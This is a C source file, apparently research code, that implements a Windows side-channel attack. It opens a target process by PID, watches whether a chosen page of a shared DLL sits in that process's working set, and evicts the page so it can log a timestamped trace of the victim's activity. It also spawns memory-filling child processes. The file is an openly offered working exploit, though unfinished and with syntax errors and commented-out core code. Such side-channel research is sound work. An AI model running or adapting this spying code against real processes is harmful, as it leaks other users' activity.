/*-----------------------------------------------------------------------------
 * main.c
 *
 * A program demonstrating the exploitation of a side channel based on
 * virtual memory and shared memory.
 *
 * Usage: ./ev_chk <-t> [target dll file] [target page] [target pid] <trace name>
 *
 * Erik Kraft
 */

// TODO idea for finding out how many memory needs to be blocked
// 1) Compile a const region of pages into the binary (read-only)
// (alternatively create a file of that size)
// 2) (should be as big as the maximal process working set size (345))
// 3) Access them so that they become part of the working set
// 4) Start blocking memory using child processes - monitor reference pages
// 5) If its seen that this pages are removed from the working set windows starts trimming the working sets
// 6) Alternatively look at available memory and block until

// target windows 8 and higher
#define _WIN32_WINNT 0x0602

/*-----------------------------------------------------------------------------
 * INCLUDES
 */
#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <string.h>
#include <time.h> 
#include <windows.h>
#include <errno.h>
#include <psapi.h>
#include <Shlwapi.h>
#include <ntstatus.h>

/*-----------------------------------------------------------------------------
 * DEFINES
 */
// general defines
#define _DEBUG_
#define DEF_PAGE_SIZE 4096
#define DEF_ACCESS_BLOCK_PAGES (25 * 1024)
#define DEF_MAX_WS_SIZE 345

// defines used for parsing command line arguments
#define CREATE_TRACE_SWITCH 0
#define FILLUP_SWITCH 1
const char* SWITCHES_STR[] = { "-t", "-f", NULL };
#define TARGET_DLL_STR 0
#define TARGET_OFFSET_STR 1
#define TARGET_PID_STR 2
#define TRACE_FILENAME_STR 3
#define ARGS_NON_TRACE 3
#define ARGS_TRACE 4

// defines for attack function
#define FILL_UP_MEM_SEM_NAME "fillUp_mem_sem"
#define COMMAND_LINE_FILLUP "evict -f"
#define FILL_UP_MEM_CHILD (25*DEF_PAGE_SIZE*1024UL)


// defines used for formatting output
#define PENDING "[PENDING] "
#define INFO "[INFO] "
#define DEBUG "[DEBUG] "
#define OK "[OK] "
#define FAIL "[FAIL] "
#define USAGE "[USAGE] "

/*-----------------------------------------------------------------------------
 * MACROS
 */
#ifdef _DEBUG_
#define DEBUG_PRINT(x) printf x
#else
#define DEBUG_PRINT(x) \
    do {               \
    } while(0)
#endif


/*-----------------------------------------------------------------------------
 * TYPE DEFINITIONS
 */
typedef struct _FileView_
{
  HANDLE file_handle_;
  HANDLE mapping_handle_;
  void *addr_;
  size_t size_;
  size_t size_pages_;
} FileView;


/*-----------------------------------------------------------------------------
 * FUNCTION PROTOTYPES
 */
void usageError(char* app_name);
int createRandomFile(char *file_name, size_t size);
int mapFile(FileView *file_view, char *file_name, DWORD file_access_flags, DWORD mapping_protection_flags, DWORD view_access_flags);
void closeFileView(FileView *file_view) ;
int spawnDirtyRAM(size_t fillup_size);
void spawnDirtyRAMChild();



/*-----------------------------------------------------------------------------
 * GLOBAL VARIABLES
 */
static int running = 1;
size_t PAGE_SIZE = 0;
LARGE_INTEGER pc_frequency = { 0 };
TCHAR module_path[MAX_PATH] = {0};

/*-----------------------------------------------------------------------------
 * SIGNAL HANDLERS
 */
BOOL quitHandler(DWORD fdwCtrlType)
{
  running = 0;
  return TRUE;
}

int main(int argc, char* argv[])
{
  // general variables
  LARGE_INTEGER eviction_start, eviction_end;
  FILETIME utc_timestamp;
  int return_value = 0;

  // variables used for processing command line arguments
  int create_trace = 0;
  int fillup = 0;
  size_t target_offset = 0;
  size_t target_pid = 0;
  char* arg_strings[3] = { NULL };
  size_t arg_i = 1, str_i = 0, s = 0;

  // variables used for statistics
  FILE* trace_file = NULL;
  size_t reference_timestamp = 0;
  time_t event_time = 0;
  size_t event_time_utc = 0;
  size_t eviction_count = 0, eviction_time_sum = 0;
  size_t event_counter = 0;

  // variables necessary for general exploit function
  SYSTEM_INFO sys_info;
  MEMORYSTATUSEX mem_stat;
  PSAPI_WORKING_SET_EX_INFORMATION page_info;
  ssize_t elapsed_time_eviction_ns = 0;
  size_t event_hold = 0;
  HINSTANCE target_dll_instance = NULL;
  HANDLE h_target_process = NULL;
  HANDLE h_resource_notification = NULL;
  size_t current_ws_min_size, current_ws_max_size;
  void* target_address = NULL;

  srand(time(NULL));

  // process command line arguments
  for(; arg_i < argc; arg_i++)
  {
    for(s = 0; SWITCHES_STR[s] != NULL; s++)
    {
      if(strcmp(argv[arg_i], SWITCHES_STR[s]) == 0)
      {
        switch(s)
        {
        case CREATE_TRACE_SWITCH:
          create_trace = 1;
          break;
        case FILLUP_SWITCH:
          spawnDirtyRAMChild();
          break;
        }
        break;
      }
    }

    // switches have to be before strings
    if(str_i != 0 && SWITCHES_STR[s] != NULL)
    {
      usageError(argv[0]);
    }
    else if(SWITCHES_STR[s] == NULL)
    {
      // to many argument strings
      if((!create_trace && str_i > ARGS_NON_TRACE) || (create_trace && str_i > ARGS_TRACE))
      {
        usageError(argv[0]);
      }

      arg_strings[str_i] = argv[arg_i];
      str_i++;
    }
  }
  // to less argument strings
  if((!create_trace && str_i < ARGS_NON_TRACE) || (create_trace && str_i < ARGS_TRACE))
  {
    usageError(argv[0]);
  }

  // get full access path of executable
  GetModuleFileNameA(NULL, module_path, MAX_PATH);
  if(GetLastError() != ERROR_SUCCESS)
  {
    printf(FAIL "Error (%d) at GetModuleFileNameA...\n", GetLastError());
    goto error;
  }

  // register signal handler for quiting the program by STRG+C
  if(!SetConsoleCtrlHandler((PHANDLER_ROUTINE)quitHandler, TRUE))
  {
    printf(FAIL "Error (%lu) at SetConsoleCtrlHandler...\n", GetLastError());
    goto error;
  }

  // retrieve frequency of performance counter
  QueryPerformanceFrequency(&pc_frequency);

  // get system information
  GetSystemInfo(&sys_info);
  PAGE_SIZE = sys_info.dwPageSize;

  // get system memory information
  mem_stat.dwLength = sizeof(mem_stat);
  if(!GlobalMemoryStatusEx(&mem_stat))
  {
    printf(FAIL "Error (%lu) at GlobalMemoryStatusEx...\n", GetLastError());
    goto error;
  }
  printf(INFO "Total usable ram: %Iu\n", mem_stat.ullTotalPhys);
  printf(INFO "Available physical ram: %Iu\n", mem_stat.ullAvailPhys);
  printf(INFO "Available paging file memory: %Iu\n", mem_stat.ullAvailPageFile);

  // get current working set size
  if(!GetProcessWorkingSetSize(GetCurrentProcess(), &current_ws_min_size, &current_ws_max_size))
  {
    printf(FAIL "Error (%lu) at GetProcessWorkingSetSize...\n", GetLastError());
    goto error;
  }

  printf(INFO "Process working set size min: %Iu byte and max: %Iu byte.\n", current_ws_min_size, current_ws_max_size);

  // open handle for low memory event
  h_resource_notification = CreateMemoryResourceNotification(LowMemoryResourceNotification);
  if(h_resource_notification == NULL) 
  {
    printf(FAIL "Error (%lu) at CreateMemoryResourceNotification...\n", GetLastError());
    goto error;
  }
  

  // calculate target page offset in byte
  target_offset = (size_t)strtol(arg_strings[TARGET_OFFSET_STR], NULL, 10) * PAGE_SIZE;
  printf(INFO "Target offset: %Ix...\n", target_offset);

  target_pid = (size_t)strtol(arg_strings[TARGET_PID_STR], NULL, 10);
  printf(INFO "Target pid: %Iu...\n", target_pid);

  // return address equals the base address of the dll file mapping in virtual memory
  target_dll_instance = LoadLibraryA(arg_strings[TARGET_DLL_STR]);
  if(target_dll_instance == NULL)
  {
    printf(FAIL "Error (%lu) at LoadLibraryA of target dll: %s...\n", GetLastError(), arg_strings[TARGET_DLL_STR]);
    goto error;
  }
  target_address = (void*)target_dll_instance + target_offset;
  printf(INFO "Target address: %p\n", target_address);
  page_info.VirtualAddress = target_address;

  printf("%p - %p\n", target_address, GetProcAddress(target_dll_instance, "MapVirtualKeyExW"));

  // should also work with PROCESS_QUERY_INFORMATION_LIMITED and PROCESS_SET_QUOTA
  h_target_process = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_SET_QUOTA, TRUE, target_pid);
  if(h_target_process == NULL)
  {
    printf(FAIL "Error (%lu) at OpenProcess...\n", GetLastError());
    goto error;
  }

  // Seems not to be necessary, consider removing
  /*mem_priority_info.MemoryPriority = MEMORY_PRIORITY_VERY_LOW;
  if(!SetProcessInformation(h_target_process, ProcessMemoryPriority,
  &mem_priority_info,sizeof(MEMORY_PRIORITY_INFORMATION)))
  {
       printf(FAIL "Error (%lu) at SetProcessInformation...\n", GetLastError());
     goto error;
  }*/

  if(create_trace)
  {
    trace_file = fopen(arg_strings[TRACE_FILENAME_STR], "w");
    if(trace_file == NULL)
    {
      printf(FAIL "Error (%s) at fopen...\n", strerror(errno));
      goto error;
    }

    if(fprintf(trace_file, "Target dll: %s\nTarget page offset: %Iu\nTime (us);Page in WS\n",
               arg_strings[TARGET_DLL_STR], target_offset / PAGE_SIZE) < 0)
    {
      printf(FAIL "Error (%s) at fprintf...\n", strerror(errno));
      goto error;
    }
  }

  printf(INFO "OK\n");

 // lets try something 
 FileView fv;
 createRandomFile("test", current_ws_max_size);
 mapFile(&fv, "test", GENERIC_READ | GENERIC_EXECUTE, PAGE_EXECUTE_READ, FILE_MAP_READ | FILE_MAP_EXECUTE);
 volatile uint8_t tmp;
 
 // activate max ws pages
 for(size_t p = 0; p < fv.size_pages_; p++)
 {
   tmp = *((uint8_t *) fv.addr_ + p * PAGE_SIZE);
 }
 
 // create eviction file
 FileView ev;
 createRandomFile("eviction", mem_stat.ullTotalPhys);
 // map eviction file
 mapFile(&ev, "eviction", GENERIC_READ | GENERIC_EXECUTE, PAGE_EXECUTE_READ, FILE_MAP_READ | FILE_MAP_EXECUTE);

 // check if in working set
 size_t in_ws = 0;
 for(size_t p = 0; p < fv.size_pages_; p++)
 {
   page_info.VirtualAddress = (uint8_t *) fv.addr_ + p * PAGE_SIZE;
   QueryWorkingSetEx(GetCurrentProcess(), &page_info, (DWORD)sizeof(PSAPI_WORKING_SET_EX_INFORMATION));
   if(page_info.VirtualAttributes.Valid)
   {
     in_ws+=PAGE_SIZE;
   }
 }
 printf("In ws %Iu/%Iu\n", in_ws, current_ws_max_size);
 
 size_t dirty_memory = 0;
 size_t spawn_dirty_pages = 0;
 void *address;
 BOOL event = 0;
 while(1)
 {
    // stepwise increase mem pressure
    /*printf("Spawn dirty MB> ");
    scanf("%Iu", &spawn_dirty_pages);
    
    spawnDirtyRAM(spawn_dirty_pages * 1024 * 1024);*/
    getchar();
    printf("Testing when event is issued...\n");
    SetFilePointer(
        ev.file_handle_,
        0,
        NULL,
        FILE_BEGIN
      );
      
    for(size_t p = 0; p < ev.size_pages_; p++)
    {
 
      SetFilePointer(
        ev.file_handle_,
        PAGE_SIZE,
        NULL,
        FILE_CURRENT
      );     
      
      if(!ReadFileEx(
                ev.file_handle_,
                (void *) &tmp,
                1,
                NULL,
                NULL,
              ))
              {
                printf(FAIL "Error (%lu) at ReadFileEx: %s...\n", GetLastError(), arg_strings[TARGET_DLL_STR]);
              }
              
        /*for(size_t p = o; p < o + DEF_ACCESS_BLOCK_PAGES; p++) 
        {
        }*/
        //tmp = *((uint8_t *) ev.addr_ + p * PAGE_SIZE);
        
        //printf("Accessed %IuMB\n", (o  + DEF_ACCESS_BLOCK_PAGES) * PAGE_SIZE);
        
        
        /*if(!GlobalMemoryStatusEx(&mem_stat))
        {
          printf(FAIL "Error (%lu) at GlobalMemoryStatusEx...\n", GetLastError());
          goto error;
        }
        printf(INFO "Available ram: %Iu\n", mem_stat.ullAvailPhys);*/
        
        // check low memory event 
        /*if(!QueryMemoryResourceNotification(h_resource_notification, &event))
        {
          printf(FAIL "Error (%lu) at QueryMemoryResourceNotification...\n", GetLastError());
        }*/
        //printf("Event: %d\n", event);
    }
    
    printf("Done...\n");
    
    /*while(1)
    {
       // check if in working set
       size_t in_ws = 0;
       for(size_t p = 0; p < fv.size_pages_; p++)
       {
         page_info.VirtualAddress = (uint8_t *) fv.addr_ + p * PAGE_SIZE;
         QueryWorkingSetEx(GetCurrentProcess(), &page_info, (DWORD)sizeof(PSAPI_WORKING_SET_EX_INFORMATION));
         if(page_info.VirtualAttributes.Valid)
         {
           in_ws+=PAGE_SIZE;
         }
       }
       printf("In ws %Iu/%Iu\n", in_ws, current_ws_max_size);
       
       Sleep(1000);
    }*/
 }

  GetSystemTimePreciseAsFileTime(&utc_timestamp);
  reference_timestamp = ((((size_t)utc_timestamp.dwHighDateTime) << 32) + utc_timestamp.dwLowDateTime) / 10;
  
  // main loop
  while(running)
  {
    GetSystemTimePreciseAsFileTime(&utc_timestamp);
    event_time_utc = ((((size_t)utc_timestamp.dwHighDateTime) << 32) + utc_timestamp.dwLowDateTime) / 10;
    event_time = time(NULL);

    if(!QueryWorkingSetEx(h_target_process, &page_info, (DWORD)sizeof(PSAPI_WORKING_SET_EX_INFORMATION)))
    {
      printf(FAIL "Error (%lu) at QueryWorkingSetEx...\n", GetLastError());
      goto error;
    }

    // event detected
    if(page_info.VirtualAttributes.Valid)
    {
      if(!event_hold)
      {
        event_hold = 1;
        event_counter++;
        printf(OK "Event fired (count: %Iu, time(NULL): %Iu, utc timestamp: %Iuus)...\n", event_counter,
               event_time, event_time_utc);

        if(create_trace)
        {
          if(fprintf(trace_file, "%Iu;1\n", event_time_utc - reference_timestamp) < 0)
          {
            printf(FAIL "Error (%s) at fprintf...\n", strerror(errno));
            goto error;
          }
        }
      }
  
      // confirm readings with direct reading of tsc coutner (previous code)
      QueryPerformanceCounter(&eviction_start);
      if(!SetProcessWorkingSetSize(h_target_process, (size_t) - 1, (size_t) - 1))
      {
        printf(FAIL "Error (%lu) at SetProcessWorkingSetSize for pid %Iu...\n", GetLastError(), target_pid);
        continue;
      }
      QueryPerformanceCounter(&eviction_end);

      elapsed_time_eviction_ns = (eviction_end.QuadPart - eviction_start.QuadPart) * 1000000000UL;
      elapsed_time_eviction_ns /= pc_frequency.QuadPart;
      eviction_time_sum += elapsed_time_eviction_ns;

      eviction_count++;
    }
    else if(!page_info.VirtualAttributes.Valid && event_hold)
    {
      printf(OK "Event released, took %Iu ns ...\n\n", elapsed_time_eviction_ns);
      event_hold = 0;
    }

    // Sleep(1);
  }

  if(event_counter > 0)
  {
    printf(INFO "Mean time to eviction per event: %Iu ns...\n", eviction_time_sum / event_counter);
  }

  goto cleanup;

error:
  return_value = -1;

cleanup:

  FreeLibrary(target_dll_instance);
  CloseHandle(h_target_process);

  if(trace_file != NULL)
  {
    fclose(trace_file);
  }

  return return_value;
}

/*-----------------------------------------------------------------------------
 * FUNCTION DEFINITIONS
 */
void usageError(char* app_name)
{
  printf(USAGE "%s <-t> [target dll file] [target page] [target pid] <trace name>\n", app_name);
  exit(-1);
}


int createRandomFile(char *filename, size_t size)
{
  LARGE_INTEGER file_size;
  HANDLE random_file = NULL;
  char *buff = malloc(PAGE_SIZE);
  if(buff == NULL)
  {
    printf(FAIL "Error (%s) at malloc...\n", strerror(errno));
    return -1;
  }

  // file does already exist
  if(PathFileExistsA(filename))
  {
    random_file = CreateFileA(filename, GENERIC_READ | GENERIC_WRITE, 0, NULL,
                                OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if(random_file == INVALID_HANDLE_VALUE)
    {
      printf(FAIL "Error (%d) at CreateFileA: %s...\n", GetLastError(), filename);
      return -1;
    }

    // get size of random file
    if(!GetFileSizeEx(random_file, &file_size))
    {
      printf(FAIL "Error (%d) at GetFileSizeEx: %s...\n", GetLastError(), filename);
      CloseHandle(random_file);
      return -1;
    }

    CloseHandle(random_file);

    if(file_size.QuadPart >= size)
    {
      printf(OK "File %s already exists...\n", filename);
      return 0;
    }
  }

  // create new file
  printf(PENDING "Creating %Iu MB random file. This might take a while...\n", size / 1024 / 1024);
  random_file = CreateFileA(filename, GENERIC_READ | GENERIC_WRITE, 0, NULL,
                              CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
  if(random_file == INVALID_HANDLE_VALUE)
  {
    printf(FAIL "Error (%d) at CreateFileA: %s...\n", GetLastError(), filename);
    return -1;
  }

  for(size_t p = 0; p < size; p += PAGE_SIZE)
  {
    if(BCryptGenRandom(NULL, (BYTE *) buff, PAGE_SIZE, BCRYPT_USE_SYSTEM_PREFERRED_RNG) != STATUS_SUCCESS)
    {
      printf(FAIL "Error (%d) at BCryptGenRandom...\n", GetLastError());
      CloseHandle(random_file);
      return -1;
    }

    if(!WriteFile(random_file, buff, PAGE_SIZE, NULL, NULL))
    {
      printf(FAIL "Error (%d) at WriteFile...\n", GetLastError());
      CloseHandle(random_file);
      return -1;
    }
  }

  CloseHandle(random_file);
  return 0;
}


int mapFile(FileView *file_view, char *file_name, DWORD file_access_flags, DWORD mapping_protection_flags, DWORD view_access_flags) 
{
  LARGE_INTEGER file_size;
  
  // zero struct
  memset(file_view, 0, sizeof(FileView));
  
  // open file
  file_view->file_handle_ = CreateFileA(file_name, file_access_flags, FILE_SHARE_READ, NULL,
                                 OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL | FILE_FLAG_RANDOM_ACCESS, NULL);
  if(file_view->file_handle_ == INVALID_HANDLE_VALUE)
  {
    printf(FAIL "Error (%d) at CreateFileA: %s...\n", GetLastError(), file_name);
    goto error;
  }

  // get file size
  if(!GetFileSizeEx(file_view->file_handle_, &file_size))
  {
    printf(FAIL "Error (%d) at GetFileSizeEx: %s...\n", GetLastError(), file_name);
    goto error;
  }
  file_view->size_ = file_size.QuadPart;
  file_view->size_pages_ = ((file_view->size_ + PAGE_SIZE - 1) / PAGE_SIZE);
 
  // map file
  /*file_view->mapping_handle_ = CreateFileMappingA(file_view->file_handle_, NULL, mapping_protection_flags, 0, 0, NULL); // SEC_LARGE_PAGES
  if(file_view->mapping_handle_ == NULL)
  {
    printf(FAIL "Error (%d) at CreateFileMappingA: %s...\n", GetLastError(), file_name);
    goto error;
  }

  file_view->addr_ = MapViewOfFile(file_view->mapping_handle_, view_access_flags, 0, 0, 0); //FILE_MAP_COPY
  if(file_view->addr_ == NULL)
  {
    printf(FAIL "Error (%d) at MapViewOfFile: %s...\n", GetLastError(), file_name);
    goto error;
  }*/

  return 0;
  
  error:
  
  closeFileView(file_view);
  return -1;
}


void closeFileView(FileView *file_view) 
{
    if(file_view->addr_ != NULL)
    {
        UnmapViewOfFile(file_view->addr_);
        file_view->addr_ = NULL;
    }
    if(file_view->mapping_handle_ != NULL) 
    {
        CloseHandle(file_view->mapping_handle_);
        file_view->mapping_handle_ = NULL;
    }
    if(file_view->file_handle_ != NULL) 
    {
        CloseHandle(file_view->file_handle_);
        file_view->file_handle_ = NULL;
    }
}

int spawnDirtyRAM(size_t fillup_size)
{
  STARTUPINFO startup_info;
  PROCESS_INFORMATION process_info;
  HANDLE sem;
  MEMORYSTATUSEX mem_stat;

  // get system information
  /*mem_stat.dwLength = sizeof(mem_stat);
  if(!GlobalMemoryStatusEx(&mem_stat))
  {
    printf(FAIL "Error (%d) at GlobalMemoryStatusEx...\n", GetLastError());
    return -1;
  }*/

  ZeroMemory(&startup_info, sizeof(startup_info));
  startup_info.cb = sizeof(startup_info);
  ZeroMemory(&process_info, sizeof(process_info));

  // create a shared semaphore
  /*sem = CreateSemaphoreA(NULL, 0, LONG_MAX, FILL_UP_MEM_SEM_NAME);
  if(GetLastError() != ERROR_SUCCESS)
  {
    DEBUG_PRINT((DEBUG
                  "Error (%d) at CreateSemaphoreA...\n", GetLastError()));
    return -1;
  }*/

  DEBUG_PRINT((DEBUG
                "Fill up size %Iu, need %Iu child processes...\n", fillup_size, (fillup_size + FILL_UP_MEM_CHILD - 1) /
                                                                                FILL_UP_MEM_CHILD));

  for(size_t i = 1; i <= (fillup_size + FILL_UP_MEM_CHILD - 1) / FILL_UP_MEM_CHILD; i++)
  {
    if(!CreateProcessA(module_path, COMMAND_LINE_FILLUP, NULL, NULL, FALSE, CREATE_NO_WINDOW,
                       NULL, NULL, &startup_info, &process_info))
    {
      DEBUG_PRINT((DEBUG
                    "Error (%d) at CreateProcessA...\n", GetLastError()));
      CloseHandle(sem);
      return -1;
    }

    // parent
    // wait until child process has finished
    /*if(WaitForSingleObject(sem, INFINITE) == WAIT_FAILED)
    {
      DEBUG_PRINT((DEBUG
                    "Error (%d) at WaitForSingleObject...\n", GetLastError()));
      CloseHandle(sem);
      return -1;
    }*/

    //fill_ram_childs->ph_[fill_ram_childs->count_] = process_info.hProcess;
    //fill_ram_childs->count_++;
  }

  //CloseHandle(sem);

  return 0;
}

void spawnDirtyRAMChild()
{
  void *dirty_mem;
  HANDLE sem;
  // childs which are filling up the memory
  DEBUG_PRINT((DEBUG
                "New child with %Iu MB dirty memory spawned...\n", FILL_UP_MEM_CHILD / 1024 / 1024));

  /*sem = OpenSemaphoreA(SYNCHRONIZE | SEMAPHORE_MODIFY_STATE, FALSE, FILL_UP_MEM_SEM_NAME);
  if(sem == NULL)
  {
    printf(FAIL"Error (%d) at OpenSemaphoreA for %s\n", GetLastError(), FILL_UP_MEM_SEM_NAME);
    exit(-1);
  }*/
  
  dirty_mem = VirtualAlloc(NULL, FILL_UP_MEM_CHILD, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if(dirty_mem == NULL)
    {
      printf("VirtualAlloc failed...\n");
      return;
    }
    
  for(size_t m = 0; m < FILL_UP_MEM_CHILD; m += DEF_PAGE_SIZE)
  {
    if(BCryptGenRandom(NULL, (BYTE *) dirty_mem + m, DEF_PAGE_SIZE, BCRYPT_USE_SYSTEM_PREFERRED_RNG) != STATUS_SUCCESS)
    {
      printf(FAIL "Error (%d) at BCryptGenRandom...\n", GetLastError());
      return;
    }
  }
  
  Sleep(INFINITE);
  
  /*fillup_mem = malloc(FILL_UP_MEM_CHILD);
  if(fillup_mem == NULL)
  {
    if(!ReleaseSemaphore(sem, 1, NULL))
    {
      DEBUG_PRINT((DEBUG
                    "Error (%d) at ReleaseSemaphore...\n", GetLastError()));
    }

    DEBUG_PRINT((DEBUG
                  "Error (%s) malloc of fillup memory...\n", strerror(errno)));
    CloseHandle(sem);
    exit(-1);
  }

  // write to fillup memory (unique contents -> no page dedouplication)
  for(size_t m = 0; m < FILL_UP_MEM_CHILD; m += page_size / 4)
  {
    *((size_t *) (fillup_mem + m)) = rand();
  }

  // finished
  if(!ReleaseSemaphore(sem, 1, NULL))
  {
    DEBUG_PRINT((DEBUG
                  "Error (%d) at ReleaseSemaphore...\n", GetLastError()));
    free(fillup_mem);
    CloseHandle(sem);
    exit(-1);
  }*/

 //CloseHandle(sem);
}